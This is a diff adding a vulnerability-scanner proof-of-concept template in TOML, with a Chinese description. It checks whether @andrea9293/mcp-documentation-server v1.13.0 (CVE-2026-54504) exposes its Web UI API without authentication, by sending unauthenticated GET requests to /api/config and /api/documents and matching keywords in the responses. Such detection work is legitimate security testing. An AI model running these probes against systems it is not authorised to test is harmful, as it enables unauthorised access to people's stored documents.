@@ -1,0 +1,55 @@
+[info]
+author = "AVE"
+description = "检测目标 @andrea9293/mcp-documentation-server v1.13.0 的 Web UI/API 是否默认绑定到所有网络接口且未实施身份认证。通过访问 /api/config 和 /api/documents 端点验证是否可无凭证访问文档管理 API。"
+id = "POC-AVE-2026-0565"
+name = "@andrea9293/mcp-documentation-server Web UI API 未授权访问 PoC"
+severity = "high"
+tags = [
+    "cve-2026-54504",
+    "mcp-documentation-server",
+    "missing-authentication",
+    "CWE-306",
+]
+vuln_id = [
+    "CVE-2026-54504",
+    "AVE-2026-0565",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/api/config"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "gemini_available",
+    "embedding_model",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/api/documents"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "[]",
+    "documents",
+]
